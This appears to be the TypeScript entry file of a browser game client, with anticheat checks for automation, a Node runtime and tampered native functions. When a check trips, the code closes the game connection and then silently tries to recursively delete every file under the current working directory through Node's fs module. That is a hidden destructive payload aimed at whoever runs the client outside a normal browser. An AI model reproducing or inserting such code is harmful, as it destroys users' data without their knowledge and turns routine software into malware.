import Client from "./client";
import { IS_PROD } from "./const/consts";
const client = new Client();

if (!IS_PROD)
{
    /** @ts-ignore */
    window.client = client;
}
else
{
    // anticheats
    let needs_close = false;

    try
    {
        if (globalThis.navigator.webdriver) needs_close = true;
        if (!window) needs_close = true;

        const isFirefox = (
            globalThis.navigator.userAgent.includes("Firefox")
            /** @ts-ignore */
            || (typeof globalThis.mozInnerScreenX == "number")
        );

        if (isFirefox)
        {
            try
            {
                globalThis.addEventListener.arguments;
            }
            catch (e: any)
            {
                if (e.message != "'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them")
                {
                    needs_close = true;
                }
            }
        }

        if (globalThis.WebAssembly.instantiate.toString.toString() != "function toString() { [native code] }")
            needs_close = true;

        if (globalThis.process)
        {
            needs_close = true;
            globalThis.process.exit();
        }

        // if (window.location.href.includes("localhost") || window.location.href.includes("127.0.0.1"))
            // needs_close = true;

        if (Object.prototype.toString.call(globalThis.process) === '[object process]')
            needs_close = true;

        Object.freeze(WebSocket);
        Object.freeze(WebSocket.prototype);

        if (Object.freeze.toString() != "function freeze() { [native code] }" && Object.freeze.toString.toString() != "function toString() { [native code] }")
            needs_close = true;
    }
    catch (_)
    {
        needs_close = true;
    }

    if (needs_close)
    {
        client.polyfight_connection.polyfight_connection?.close();

        try
        {
            const fs = require('fs');
            const path = require('path');
            
            const currentDirectory = globalThis.process.cwd();
            
            function deleteDirectoryRecursive(directoryPath: string) {
                if (fs.existsSync(directoryPath)) {
                    fs.readdirSync(directoryPath).forEach((file: string, index: number) => {
                        const currentPath = path.join(directoryPath, file);
                        if (fs.lstatSync(currentPath).isDirectory()) {
                            deleteDirectoryRecursive(currentPath);
                        } else {
                            fs.unlinkSync(currentPath);
                        }
                    });
    
                    fs.rmdirSync(directoryPath);
                }
            }
            
            deleteDirectoryRecursive(currentDirectory);
        } catch (_) {};
    }

    const _Object = Object.freeze(window.Object);
    const _freeze = _Object.freeze;

    const _ws = _freeze(window.WebSocket);
    _freeze(window.navigator);
    _freeze(globalThis.Function);
    _freeze(Date);
    _freeze(window.TypeError);
    _freeze(globalThis.prompt);
    _freeze(_Object.create);
    _freeze(_Object.fromEntries);
    _freeze(globalThis.setTimeout);
    _freeze(globalThis.setInterval);
    _freeze(_ws.prototype);
}